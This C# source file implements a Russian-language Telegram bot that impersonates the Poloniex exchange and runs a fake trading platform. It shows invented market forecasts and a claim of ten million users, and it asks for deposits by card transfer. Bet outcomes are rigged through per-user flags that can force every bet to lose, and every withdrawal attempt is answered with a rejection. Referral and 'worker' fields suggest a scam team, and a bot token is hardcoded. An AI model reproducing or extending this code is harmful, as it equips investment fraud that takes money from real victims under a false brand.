using Newtonsoft.Json;
using System.Linq;
using System.Text;
using System.Threading;
using Telegram.Bot;
using Telegram.Bot.Exceptions;
using Telegram.Bot.Polling;
using Telegram.Bot.Requests.Abstractions;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.InlineQueryResults;
using Telegram.Bot.Types.ReplyMarkups;

TGBot telegramBot = new TGBot();
await telegramBot.Main();

class UserData
{
    public double Balance { get; set; }
    public int NumOfTransactions { get; set; }
    public DateTime DateOfRegister { get; set; }
    // Фишки для ставочек
    public double InvestmentAmount { get; set; }
    public string CourseDirection { get; set; }
    public string SelectedAsset { get; set; }
    public string ShowedChangeDirection { get;set; }
    public string Status { get; set; }
    // Кто есть кто
    public bool IsWorker { get; set; }
    public bool IsAdmin { get; set; }
    public List<UserData> Refferals { get; set; }

    public string Username { get; set; }
    public long Id { get; set; }

    public UserData(long id, string username)
    {
        Balance = 0;
        NumOfTransactions = 0;
        DateOfRegister = DateTime.Now;
        Id = id;
        Username = username;

        IsWorker = false;
        CourseDirection = "Вверх ⬆";
        ShowedChangeDirection = "вниз";
        InvestmentAmount = 0;
        Status = "RANDOM";
        Refferals = new List<UserData>();
    }
}

class TGBot
{
    Message idMessage = null;
    ITelegramBotClient botClient;

    Random random = new Random();

    bool waitSumWithdraw = false;
    bool waitRequisites = false;
    bool waitSumInvestment = false;
    bool waitUpdateBetThread = false;

    List<UserData> users;

    public TGBot()
    {
        LoadData();
        // СОХРАНЕНИЕ ЗАГРУЗКА
    }

    private void SaveData()
    {
        if (users == null) return;

        string filePath = Path.Combine(Environment.CurrentDirectory, "..\\..\\..\\Data/users.txt");

        using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Write))
        { 
            string data = JsonConvert.SerializeObject(users, Formatting.Indented);
            byte[] dataBytes = Encoding.UTF8.GetBytes(data);   
            fileStream.Write(dataBytes, 0, dataBytes.Length);
        }

        //using (StreamWriter sw = new StreamWriter("Data/users.txt"))
        //{
        //    sw.WriteLine(JsonConvert.SerializeObject(users));
        //}
    }

    private void LoadData()
    {
        string filePath = Path.Combine(Environment.CurrentDirectory, "..\\..\\..\\Data/users.txt");

        using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
        {
            byte[] dataBytes = new byte[fileStream.Length];
            fileStream.Read(dataBytes, 0, dataBytes.Length);
            string dataRead = Encoding.UTF8.GetString(dataBytes);
            users = JsonConvert.DeserializeObject<List<UserData>>(dataRead);
            if(users == null) users = new List<UserData>();
        }
    }

    public async Task Main()
    {
        botClient = new TelegramBotClient("6506500394:AAHvdxVj9GH1v6PUtKIaqDOVuE7ZBykFkoY");

        using CancellationTokenSource cts = new();

        ReceiverOptions receiverOptions = new()
        {
            AllowedUpdates = Array.Empty<UpdateType>() 
        };

        botClient.StartReceiving(
            updateHandler: HandleUpdateAsync,
            pollingErrorHandler: HandlePollingErrorAsync,
            receiverOptions: receiverOptions,
            cancellationToken: cts.Token
        );

        var me = await botClient.GetMeAsync();

        Console.WriteLine($" ------------------------------\n| БОТИК ЗАПУЩЕН @{me.Username} |\n ------------------------------\nТут будут выводиться всякие сообщения от бота.\nНапример, присоединение нового пользователя.\n");
        Console.ReadLine();

        cts.Cancel();
    }

    private UserData? USER(long id)
    {
        if (users.Count > 0) 
        {
            long[] idS = new long[users.Count];
            foreach (var user in users) { if (user.Id == id) return user; }           
        }
        return null;
    }

    private void ADDUSER(long id, string username)
    {
        users.Add(new UserData(id, username));
        SaveData(); 

        Console.Write("ПОЛЬЗОВАТЕЛЬ "); Console.ForegroundColor = ConsoleColor.Black; Console.BackgroundColor = ConsoleColor.White;
        Console.Write(id); Console.ForegroundColor = ConsoleColor.Gray; Console.BackgroundColor = ConsoleColor.Black;
        Console.WriteLine(" ПРИСОЕДИНИЛСЯ К БАЗЕ ДАННЫХ");
    }

    async Task HandleUpdateAsync(ITelegramBotClient botClient, Update update, CancellationToken cancellationToken)
    {
        Message? message = null;
        if (update.Message != null) message = update.Message;


        if (message != null && USER(message.Chat.Id) == null) ADDUSER(message.Chat.Id, message.Chat.Username); // Регистрация пользователя        

        if(message != null)
        {
            var chatId = message.Chat.Id;
            var user = USER(chatId);

            if (message.Text.StartsWith("/start") && !waitUpdateBetThread)
            {
                DisableChecks();

                InlineKeyboardMarkup inlineKeyboard = new(new[]{
                new [] { InlineKeyboardButton.WithCallbackData("🧮 Открыть ECN счёт", "createECNAccount") },
                new [] { InlineKeyboardButton.WithCallbackData("💳 Внести средства", "deposit") },
                new [] { InlineKeyboardButton.WithCallbackData("🏦 Вывести средства", "withdraw") },
                new [] { InlineKeyboardButton.WithUrl(text: "📒 Отзывы о нас", url: "https://crypto.ru/otzyvy-poloniex/"), InlineKeyboardButton.WithCallbackData("👨‍💻 Тех Поддерджка", "techSupport") }
            });

                idMessage = await botClient.SendTextMessageAsync(
                    chatId: chatId, // ДОДЕЛАТЬ КОД! ЧЕРЕЗ ССЫЛКУ В СТАРТ ПЕРЕДАЕТСЯ АЙДИШНИК РЕФЕРАЛА!
                    text: $"https://t.me/poloniexruBot?start={user.Id}\n👤Личный кабинет: @{message.Chat.Username}\n<i>🔎 TlgmID: {chatId}</i>\n\n💰 Баланс: <i>{user.Balance} ₽</i>\n🤝🏻 Кол-во сделок: <i>{user.NumOfTransactions}</i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nRUB 🟢 ➗    KZT  🟢 ➗    UAH 🟢\nUSD 🟢 ➗    EUR  🟢 ➗    PLN  🟢\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\n🔸 C нами уже более 10⁷ пользователей 🔸\n\n📅 Дата регистрации: {user.DateOfRegister.ToLongDateString()}   {user.DateOfRegister.ToLongTimeString()}",
                    replyMarkup: inlineKeyboard,
                    parseMode: ParseMode.Html,
                    cancellationToken: cancellationToken);
            }
            else if (waitSumWithdraw)
            {
                double sum;
                if (double.TryParse(message.Text, out sum) && sum <= user.Balance && sum >= 5000)
                {
                    waitSumWithdraw = false;
                    waitRequisites = true;

                    InlineKeyboardMarkup inlineKeyboard = new(new[]{
                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", "loadMenu") }
                     });

                    idMessage = await botClient.EditMessageTextAsync(
                        chatId: idMessage.Chat.Id,
                        messageId: idMessage.MessageId,
                        text: $"❕ Вывод возможен только на реквизиты с которых пополнялся Ваш баланс.\n\n💬 Отправьте сообщение с реквизитами карты на которую будет осуществлён вывод.",
                        replyMarkup: inlineKeyboard,
                        parseMode: ParseMode.Html,
                        cancellationToken: cancellationToken);
                } 
                else
                {
                    InlineKeyboardMarkup inlineKeyboard = new(new[]{
                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", "loadMenu") }
                });

                    await botClient.DeleteMessageAsync(idMessage.Chat.Id, idMessage.MessageId);
                    await botClient.DeleteMessageAsync(chatId, message.MessageId);

                    idMessage = await botClient.SendTextMessageAsync(
                        chatId: idMessage.Chat.Id,
                        text: $"<b>❗️ Cумма для вывода не должна:</b>\n▪️ Занижать минимально-допустимую.\n▪️ Превышать ваш баланс.\n\n💰 На вашем балансе: <i>{user.Balance} ₽</i>\n\n💬 Отправьте сообщение с суммой для вывода.",
                        replyMarkup: inlineKeyboard,
                        parseMode: ParseMode.Html,
                        cancellationToken: cancellationToken);
                }
            }
            else if(waitRequisites)
            {
                InlineKeyboardMarkup inlineKeyboard = new(new[]{
                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", "loadMenu") }
                });

                await botClient.DeleteMessageAsync(idMessage.Chat.Id, idMessage.MessageId);
                await botClient.DeleteMessageAsync(chatId, message.MessageId);

                idMessage = await botClient.SendTextMessageAsync(
                    chatId: idMessage.Chat.Id,
                    text: $"❌ Введённая карта несоответсвует требованиям.\n❕ Вывод возможен только на реквизиты с которых осуществлялось пополнение.\n❕ Карта должна быть действительной.\n❕ Банк должен быть доступен.\n\n💬 Отправьте сообщение с реквизитами карты на которую будет осуществлён вывод.",
                    replyMarkup: inlineKeyboard,
                    parseMode: ParseMode.Html,
                    cancellationToken: cancellationToken);
            }
            else if(waitSumInvestment)
            {
                waitSumInvestment = false;

                double sum;
                if (double.TryParse(message.Text, out sum) && sum <= user.Balance && sum >= 500) user.InvestmentAmount = sum;

                InlineKeyboardMarkup inlineKeyboard = new(new[]{
                     new [] { InlineKeyboardButton.WithCallbackData($"Актив пойдёт {user.ShowedChangeDirection}", "betChangeDirection") },
                     new [] { InlineKeyboardButton.WithCallbackData("Ввести сумму инвестиции", "enterSumInvestment") },
                     new [] { InlineKeyboardButton.WithCallbackData(text: "🔙 Вернутся к выбору актива", "createECNAccount"), InlineKeyboardButton.WithCallbackData("Подтвердить", "betAccept") }
                 });

                await botClient.DeleteMessageAsync(idMessage.Chat.Id, idMessage.MessageId);
                await botClient.DeleteMessageAsync(chatId, message.MessageId);

                idMessage = await botClient.SendTextMessageAsync(
                    chatId: message.Chat.Id,
                    text: $"Ваш баланс: {user.Balance} ₽\n<i>Минимальная сумма инвестиции: <b>500 ₽</b></i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nВыбранные активы: {user.SelectedAsset}\n\nВведённая сумма инвестиции: <b>{user.InvestmentAmount} ₽</b>\nПредположеное направление курса: {user.CourseDirection[user.CourseDirection.Length-1]}",
                    replyMarkup: inlineKeyboard,
                    parseMode: ParseMode.Html,
                    cancellationToken: cancellationToken);
            }
            else
            {
                await botClient.DeleteMessageAsync(message.Chat.Id, message.MessageId);
            }
        }

        if (update.CallbackQuery is { } callbackQuery)
        {
            var callbackData = callbackQuery.Data; // Текст который вернула инлайн-кнопка

            if (idMessage != null)
            {
                SendButtons(botClient, idMessage, cancellationToken, callbackData);
            }
        }
    }

    void DisableChecks()
    {
        waitSumWithdraw = false;
        waitRequisites = false;
        waitSumInvestment = false;
        waitUpdateBetThread = false;
    }

    async void SendButtons(ITelegramBotClient botClient, Message message, CancellationToken cancellationToken, string type)
    {
        if (message != null && USER(message.Chat.Id) == null) ADDUSER(message.Chat.Id, message.Chat.Username); 
        var user = USER(message.Chat.Id);

        if (message != null)
        {
            if (type == "loadMenu")
            {
                DisableChecks();

                InlineKeyboardMarkup inlineKeyboard = new(new[]{
                new [] { InlineKeyboardButton.WithCallbackData("🧮 Открыть ECN счёт", "createECNAccount") },
                new [] { InlineKeyboardButton.WithCallbackData("💳 Внести средства", "deposit") },
                new [] { InlineKeyboardButton.WithCallbackData("🏦 Вывести средства", "withdraw") },
                new [] { InlineKeyboardButton.WithUrl(text: "📒 Отзывы о нас", url: "https://crypto.ru/otzyvy-poloniex/"), InlineKeyboardButton.WithCallbackData("👨‍💻 Тех Поддерджка", "techSupport") }
            });

                if (idMessage != null)
                {
                    idMessage = await botClient.EditMessageTextAsync(
                        chatId: message.Chat.Id,
                        messageId: idMessage.MessageId,
                        text: $"👤Личный кабинет: @{message.Chat.Username}\n<i>🔎 TlgmID: {message.Chat.Id}</i>\n\n💰 Баланс: <i>{user.Balance} ₽</i>\n🤝🏻 Кол-во сделок: <i>{user.NumOfTransactions}</i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nRUB 🟢 ➗    KZT  🟢 ➗    UAH 🟢\nUSD 🟢 ➗    EUR  🟢 ➗    PLN  🟢\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\n🔸 C нами уже более 10⁷ пользователей 🔸\n\n📅 Дата регистрации: {user.DateOfRegister.ToLongDateString()} {user.DateOfRegister.ToLongTimeString()}",
                        replyMarkup: inlineKeyboard,
                        parseMode: ParseMode.Html,
                        cancellationToken: cancellationToken);
                }
                else
                {
                    idMessage = await botClient.SendTextMessageAsync(
                       chatId: message.Chat.Id,
                       text: $"👤Личный кабинет: @{message.Chat.Username}\n<i>🔎 TlgmID: {message.Chat.Id}</i>\n\n💰 Баланс: <i>{user.Balance} ₽</i>\n🤝🏻 Кол-во сделок: <i>{user.NumOfTransactions}</i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nRUB 🟢 ➗    KZT  🟢 ➗    UAH 🟢\nUSD 🟢 ➗    EUR  🟢 ➗    PLN  🟢\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\n🔸 C нами уже более 10⁷ пользователей 🔸\n\n📅 Дата регистрации: {user.DateOfRegister.ToLongDateString()} {user.DateOfRegister.ToLongTimeString()}",
                       replyMarkup: inlineKeyboard,
                       parseMode: ParseMode.Html,
                       cancellationToken: cancellationToken);
                }

            }
            else if(type.Length > 8 && type[..8] == "withdraw")
            {
                string selectedPaymentSystem = type[8..];
                if (selectedPaymentSystem == "BankCard") selectedPaymentSystem = "Банк 💳";
                else if (selectedPaymentSystem == "QIWI") selectedPaymentSystem = "QIWI 🥝";
                else selectedPaymentSystem = "Банк 🇧🇾";

                waitSumWithdraw = true;

                InlineKeyboardMarkup inlineKeyboard = new(new[]{
                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", "loadMenu") }
                });

                idMessage = await botClient.EditMessageTextAsync(
                    chatId: idMessage.Chat.Id,
                    messageId: idMessage.MessageId,
                    text: $"💰 <b>Ваш баланс: <i>{user.Balance} ₽</i></b>\n<i>Выбранная система: {selectedPaymentSystem}</i>\n\n❕ Минимальная сумма для вывода: <i><u>5000 ₽</u></i>\n\n💬 Отправьте сообщение с суммой для вывода.",
                    replyMarkup: inlineKeyboard,
                    parseMode: ParseMode.Html,
                    cancellationToken: cancellationToken);
            }
            else if(type == "withdraw")
            {
                InlineKeyboardMarkup inlineKeyboard = new(new[]{
                new[] { InlineKeyboardButton.WithCallbackData("💳 Банковская карта", callbackData: "withdrawBankCard"), InlineKeyboardButton.WithCallbackData(text: "🥝 QIWI Wallet", callbackData: "withdrawQIWI") },
                new[] {InlineKeyboardButton.WithCallbackData(text: "🇧🇾 Беларусская карта", "withdrawBelarussianCard") },
                new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", callbackData: "loadMenu") }
            });

                idMessage = await botClient.EditMessageTextAsync(
                    chatId: idMessage.Chat.Id,
                    messageId: idMessage.MessageId,
                    text: "🖨 Выберите на какую систему будет произведён вывод средств.",
                    replyMarkup: inlineKeyboard,
                    parseMode: ParseMode.Html,
                    cancellationToken: cancellationToken);
            }
            else if(type == "deposit")
            {
                InlineKeyboardMarkup inlineKeyboard = new(new[]{
                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", callbackData: "loadMenu") }
                });

                idMessage = await botClient.EditMessageTextAsync(
                    chatId: idMessage.Chat.Id,
                    messageId: idMessage.MessageId,
                    text: $"✅ Минимальная сумма пополнения: <i><u>5000 ₽</u></i>\n\n🥝 Номер карты для QIWI: <code>Недоступно</code> ( <i>До 10000 ₽</i> )\n💳 Номер карты для банка: <code>Недоступно</code>\n\n📝 Комментарий при переводе: <code>@{user.Username}</code>\n\n❕ Пополнение доступно для жителей Беларуси, через техническую поддержку ( @Poloniexx_support ).\n\n❕ Если нет возможности оставить комментарий или Вы ошиблись с указанием комментария, отправьте чек в техническую поддержку ( @Poloniexx_support ).\n\n✳️ Средства пополняются автоматически, время обработки до 5 минут.",
                    replyMarkup: inlineKeyboard,
                    parseMode: ParseMode.Html,
                    cancellationToken: cancellationToken);
            }
            else if (type == "createECNAccount")
            {
                user.InvestmentAmount = 0;
                user.SelectedAsset = string.Empty;

                InlineKeyboardMarkup inlineKeyboard = new(new[]{
                new[] { InlineKeyboardButton.WithCallbackData(text: "™️ Акционные активы", callbackData: "assetsEquity"), InlineKeyboardButton.WithCallbackData("💶 Фиатные активы", callbackData: "assetsFiat") },
                new[] {InlineKeyboardButton.WithCallbackData(text: "👛 Криптовалюта", "assetsCrypto") },
                new[] {InlineKeyboardButton.WithCallbackData(text: "🔙 Вернутся в главное меню", "loadMenu") }
            });

                idMessage = await botClient.EditMessageTextAsync(
                    chatId: idMessage.Chat.Id,
                    messageId: idMessage.MessageId,
                    text: "💶 Фиатные - Физическая валюта.\n™️ Акционные - Акции компаний.\n👛 Криптовалюта - Вид цифровой валюты.\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\n<b>Выберите категорию активов.</b>",
                    replyMarkup: inlineKeyboard,
                    parseMode: ParseMode.Html,
                    cancellationToken: cancellationToken);
            }
            else if(type == "enterSumInvestment")
            {
                waitSumInvestment = true;

                idMessage = await botClient.EditMessageTextAsync(
                    chatId: message.Chat.Id,
                    messageId: message.MessageId,
                    text: "Отправьте сумму для инвестиции.",
                    cancellationToken: cancellationToken);
            }
            else if(type.Length > 3 && type[..3] == "bet")
            {
                bool successfully = true;

                if (type[3..] == "ChangeDirection")
                {
                    if (user.CourseDirection.Contains("Вверх")) { user.CourseDirection = "Вниз ⬇"; user.ShowedChangeDirection = "вверх"; }
                    else { user.CourseDirection = "Вверх ⬆"; user.ShowedChangeDirection = "вниз"; }
                }
                else if (type[3..] == "Accept")
                {
                    if (user.InvestmentAmount >= 500 && user.Balance >= user.InvestmentAmount)
                    {
                        var updateThread = new Thread(() => UpdateMessageBet(cancellationToken, user));
                        updateThread.Start();
                    }
                    else
                    {
                        successfully = false;
                    }
                }    
                else user.SelectedAsset = type[3..];

                if (type[3..] != "Accept")
                {
                    InlineKeyboardMarkup inlineKeyboard = new(new[]{
                    new [] { InlineKeyboardButton.WithCallbackData($"Актив пойдёт {user.ShowedChangeDirection}", "betChangeDirection") },
                    new [] { InlineKeyboardButton.WithCallbackData("Ввести сумму инвестиции", "enterSumInvestment") },
                    new [] { InlineKeyboardButton.WithCallbackData(text: "🔙 Вернутся к выбору актива", "createECNAccount"), InlineKeyboardButton.WithCallbackData("Подтвердить", "betAccept") }
                });

                    string mess = $"Ваш баланс: {user.Balance} ₽\n<i>Минимальная сумма инвестиции: <b>500 ₽</b></i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nВыбранные активы: {user.SelectedAsset}\n\nВведённая сумма инвестиции: <b>{user.InvestmentAmount} ₽</b>\nПредположеное направление курса: {user.CourseDirection[user.CourseDirection.Length-1]}";

                    await botClient.DeleteMessageAsync(idMessage.Chat.Id, idMessage.MessageId);

                    idMessage = await botClient.SendTextMessageAsync(
                        chatId: message.Chat.Id,
                        text: successfully ? mess : "‼️Депозит должен быть больше или равен минимальному‼️\n\n" + mess,
                        replyMarkup: inlineKeyboard,
                        parseMode: ParseMode.Html,
                        cancellationToken: cancellationToken);
                }                
            }
            else if (type.Length > 6 && type[..6] == "assets")
            {
                InlineKeyboardMarkup inlineKeyboard = new(new[] { new[] { InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", "loadMenu") } });

                if (type[6..] == "Fiat")
                {
                    inlineKeyboard = new(new[]{
                    new[] { InlineKeyboardButton.WithCallbackData($"USD {GetForecast()}", "betUSD"), InlineKeyboardButton.WithCallbackData($"EUR {GetForecast()}",  "betEUR") },
                    new[] { InlineKeyboardButton.WithCallbackData($"RUB {GetForecast()}", "betRUB"), InlineKeyboardButton.WithCallbackData($"KZT {GetForecast()}", "betKZT") },
                    new[] { InlineKeyboardButton.WithCallbackData($"UAN {GetForecast()}", "betUAN"), InlineKeyboardButton.WithCallbackData($"PLN {GetForecast()}", "betPLN") },
                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся к выбору актива", "createECNAccount") }
                     });
                }
                else if (type[6..] == "Crypto")
                {
                    inlineKeyboard = new(new[]{
                    new[] { InlineKeyboardButton.WithCallbackData($"BTC {GetForecast()}", "betBTC"), InlineKeyboardButton.WithCallbackData($"MIOTA {GetForecast()}", "betMIOTA"), InlineKeyboardButton.WithCallbackData($"NEO {GetForecast()}", "betNEO") },
                    new[] { InlineKeyboardButton.WithCallbackData($"BCH {GetForecast()}", "betBCH"), InlineKeyboardButton.WithCallbackData($"XRP {GetForecast()}", "betXRP"), InlineKeyboardButton.WithCallbackData($"XEM {GetForecast()}", "betXEM") },
                    new[] { InlineKeyboardButton.WithCallbackData($"DASH {GetForecast()}", "betDASH"), InlineKeyboardButton.WithCallbackData($"DOGE {GetForecast()}", "betDOGE"), InlineKeyboardButton.WithCallbackData($"ETH {GetForecast()}", "betETH") },
                    new[] { InlineKeyboardButton.WithCallbackData($"LTC {GetForecast()}", "betLTC"), InlineKeyboardButton.WithCallbackData($"XMR {GetForecast()}", "betXMR"), InlineKeyboardButton.WithCallbackData($"ETC {GetForecast()}", "betETC") },
                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся к выбору актива", "createECNAccount") }
                     });
                }        
                else if (type[6..] == "Equity")
                {
                    inlineKeyboard = new(new[]
                    {
                        new[] { InlineKeyboardButton.WithCallbackData($"GOOG {GetForecast()}", "betGOOG"), InlineKeyboardButton.WithCallbackData($"AMZN {GetForecast()}", "betAMZN"), InlineKeyboardButton.WithCallbackData($"SBER {GetForecast()}", "betSBER") },
                        new[] { InlineKeyboardButton.WithCallbackData($"NKE {GetForecast()}", "betNKE"), InlineKeyboardButton.WithCallbackData($"BRK.A {GetForecast()}", "betBRK.A"), InlineKeyboardButton.WithCallbackData($"BA {GetForecast()}", "betBA") },
                        new[] { InlineKeyboardButton.WithCallbackData($"TSLA {GetForecast()}", "betTSLA") },
                        new[] { InlineKeyboardButton.WithCallbackData($"KO {GetForecast()}", "betKO"), InlineKeyboardButton.WithCallbackData($"INTC {GetForecast()}", "betINTC"), InlineKeyboardButton.WithCallbackData($"MA {GetForecast()}", "betMA") },
                        new[] { InlineKeyboardButton.WithCallbackData($"MCD {GetForecast()}", "betMCD"), InlineKeyboardButton.WithCallbackData($"META {GetForecast()}", "betMETA"), InlineKeyboardButton.WithCallbackData($"MSFT {GetForecast()}", "betMSFT") },
                        new[] { InlineKeyboardButton.WithCallbackData($"AAPL {GetForecast()}", "betAAPL") },
                        new[] { InlineKeyboardButton.WithCallbackData($"NFLX {GetForecast()}", "betNFLX"), InlineKeyboardButton.WithCallbackData($"NVDA {GetForecast()}", "betNVDA"), InlineKeyboardButton.WithCallbackData($"PEP {GetForecast()}", "betPEP") },
                        new[] { InlineKeyboardButton.WithCallbackData($"PFE {GetForecast()}", "betPFE"), InlineKeyboardButton.WithCallbackData($"VISA {GetForecast()}", "betVISA"), InlineKeyboardButton.WithCallbackData($"SBUX {GetForecast()}", "betSBUX") },
                        new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся к выбору актива", "createECNAccount") }
                    });
                }

                idMessage = await botClient.EditMessageTextAsync(
                    chatId: idMessage.Chat.Id,
                    messageId: idMessage.MessageId,
                    text: "🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nВыберите актив.",
                    replyMarkup: inlineKeyboard,
                    parseMode: ParseMode.Html,
                    cancellationToken: cancellationToken);
            }
            else if (type == "techSupport")
            {
                InlineKeyboardMarkup inlineKeyboard = new(new[]{
                new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", "loadMenu") }
            });

                idMessage = await botClient.EditMessageTextAsync(
                    chatId: idMessage.Chat.Id,
                    messageId: idMessage.MessageId,
                    text: "<b>Заметили <u>ошибку</u>, есть <u>проблема</u>, <u>вопрос</u>?</b>\nСкорей пиши в нашу службу поддержки!\n\n<b>Не забывай соблюдать правила культурного общения</b>\n<i>Общайся вежливо, не спамь, не флуди, не перебивай.</i>\n\n‼️ За оффтоп можно получить от мута до бана.\n\n💻 Техническая поддержка: @Poloniexx_support",
                    replyMarkup: inlineKeyboard,
                    parseMode: ParseMode.Html,
                    cancellationToken: cancellationToken);
            }
        }
    }

    async void UpdateMessageBet(CancellationToken cancellationToken, UserData user)
    {
        for (int i = 15; i >= 1; i--)
        {
            idMessage = await botClient.EditMessageTextAsync(
            chatId: idMessage.Chat.Id,
            messageId: idMessage.MessageId,
            text: $"Получение данных о графике: {i} секунд",
            cancellationToken: cancellationToken);

            Thread.Sleep(1000);
        }

        user.NumOfTransactions++;
        bool betClosed = false;
        string courseChanged;

        if(user.Status == "RANDOM") // ОПРЕДЕЛЯЕМ РАНДОМНО ЗАШЛА ЛИ СТАВКА
        {
            int r = random.Next(1, 3);

            if(r == 1)
            {
                betClosed = true;
                user.Balance += user.InvestmentAmount * 0.8;
            }
            else
            {
                betClosed = false;
                user.Balance -= user.InvestmentAmount;
            }
        }
        else if(user.Status == "LOSE") // СТАВКА ВСЕГДА ПРОСИРАЕТСЯ
        {
            betClosed = false;
            user.Balance -= user.InvestmentAmount;
        }
        else // СТАВКА ВСЕГДА ЗАХОДИТ
        {
            betClosed = true;
            user.Balance += user.InvestmentAmount * 0.8;
        }

        if (user.CourseDirection.Contains("Вверх")) courseChanged = betClosed ? user.CourseDirection : "Вниз ⬇";
        else courseChanged = betClosed ? user.CourseDirection : "Вверх ⬆";

        InlineKeyboardMarkup inlineKeyboard = new(new[]{
                new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", "loadMenu") }
            });

        idMessage = await botClient.EditMessageTextAsync(
            chatId: idMessage.Chat.Id,
            messageId: idMessage.MessageId,
            text: $"Имя пользователя: <i>@{user.Username}</i>\nTelegramID: <i>{user.Id}</i>\n\nИнвестиция в актив: <i>{user.SelectedAsset}</i>\nСумма инвестиции: <i>{user.InvestmentAmount} ₽</i>\nПрогноз пользователя: <i>{user.CourseDirection}</i>\nПроцент при успешном прогнозе: <i><u>180%</u></i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nИзменения актива: {user.SelectedAsset}\n\nКурс изменился: {courseChanged}\n{(betClosed ? "Прибыль" : "Убыток")} составляет: {(betClosed ? user.InvestmentAmount * 0.8 : user.InvestmentAmount)}\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\n🗓 {DateTime.Now.ToShortDateString()}, {DateTime.Now.ToLongTimeString()}",
            replyMarkup: inlineKeyboard,
            parseMode: ParseMode.Html,
            cancellationToken: cancellationToken);

        user.InvestmentAmount = 0;
        user.SelectedAsset = string.Empty;

        SaveData();
    }

    string GetForecast()
    {
        int r1 = random.Next(1, 11);
        int r2 = random.Next(1, 100);

        if (r1 <= 5) return $"-0.{r2}% 📉";
        else return $"+0.{r2}% 📈";
    }

    Task HandlePollingErrorAsync(ITelegramBotClient botClient, Exception exception, CancellationToken cancellationToken)
    {
        var ErrorMessage = exception switch
        {
            ApiRequestException apiRequestException
                => $"Telegram API Error:\n[{apiRequestException.ErrorCode}]\n{apiRequestException.Message}",
            _ => exception.ToString()
        };

        Console.WriteLine(ErrorMessage);
        return Task.CompletedTask;
    }
}